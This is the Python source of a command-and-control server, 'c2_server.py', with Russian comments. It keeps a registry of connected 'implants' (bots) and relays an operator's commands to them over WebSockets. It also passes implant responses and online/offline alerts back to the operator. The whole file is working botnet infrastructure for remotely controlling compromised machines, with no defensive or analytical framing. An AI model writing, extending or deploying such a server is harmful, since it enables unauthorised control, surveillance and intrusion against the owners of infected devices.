#
# --- Файл: c2_server.py (Версия 3.2 - с правильными отступами) ---
#
import asyncio, json, os
from aiohttp import web

IMPLANTS, OPERATOR = {}, None

async def send_notification_to_operator(message):
 """Отправляет оператору ПРИКАЗ отправить уведомление в Telegram."""
 if OPERATOR and not OPERATOR.closed:
  try:
   await OPERATOR.send_json({'type': 'notification', 'data': message})
  except Exception:
   pass

async def broadcast_bot_list():
 """Отправляет оператору актуальный список ботов."""
 if OPERATOR and not OPERATOR.closed:
  try:
   await OPERATOR.send_json({'type': 'bot_list', 'data': list(IMPLANTS.keys())})
  except Exception:
   pass

async def websocket_handler(request):
 global OPERATOR, IMPLANTS
 ws = web.WebSocketResponse()
 await ws.prepare(request)
 client_type, client_id = None, None

 try:
  async for msg in ws:
   if msg.type != web.WSMsgType.TEXT:
    continue
   if msg.data == 'ping':
    await ws.send_str('pong')
    continue

   try:
    data = json.loads(msg.data)
   except json.JSONDecodeError:
    print(f"[!] Получен мусор от клиента, игнорирую.")
    continue

   if client_type is None:
    msg_type = data.get('type')
    if msg_type == 'operator':
     client_type = 'operator'
     OPERATOR = ws
     print("[+] Оператор подключился.")
     await broadcast_bot_list()
    elif msg_type == 'implant':
     client_type = 'implant'
     client_id = data.get('id')
     IMPLANTS[client_id] = {"ws": ws}
     print(f"[+] Новый имплант онлайн: {client_id}")
     await broadcast_bot_list()
     await send_notification_to_operator(f"✅ Имплант ОНЛАЙН: {client_id}")
     if OPERATOR and not OPERATOR.closed:
      data['bot_id'] = client_id
      await OPERATOR.send_json({'type': 'bot_details', 'bot_id': client_id, 'data': data})
    else:
     break
    continue

   if client_type == 'operator':
    target_id = data.get('target_id')
    payload = data.get('payload')
    if data.get('type') in ['command', 'get_details', 'get_volume_state'] and target_id in IMPLANTS:
     target_ws = IMPLANTS[target_id]["ws"]
     if not target_ws.closed:
      await target_ws.send_json(payload)
     else:
      del IMPLANTS[target_id]
      await broadcast_bot_list()
   elif client_type == 'implant':
    if OPERATOR and not OPERATOR.closed:
     data['bot_id'] = client_id
     await OPERATOR.send_json(data)

 except Exception as e:
  print(f"[!] Непредвиденная ошибка в сессии с {client_id or 'клиентом'}: {e}")
 finally:
  if client_type == 'implant' and client_id in IMPLANTS:
   del IMPLANTS[client_id]
   print(f"[-] Имплант отключился: {client_id}")
   await broadcast_bot_list()
   await send_notification_to_operator(f"❌ Имплант ОТКЛЮЧИЛСЯ: {client_id}")
  elif client_type == 'operator':
   OPERATOR = None
   print("[-] Оператор отключился.")

 return ws

async def http_handler(request):
 return web.FileResponse(os.path.join(os.path.dirname(__file__), 'index.html'))

app = web.Application()
app.router.add_get('/', http_handler)
app.router.add_get('/ws', websocket_handler)

if __name__ == "__main__":
 port = int(os.environ.get("PORT", 8080))
 web.run_app(app, host='0.0.0.0', port=port)
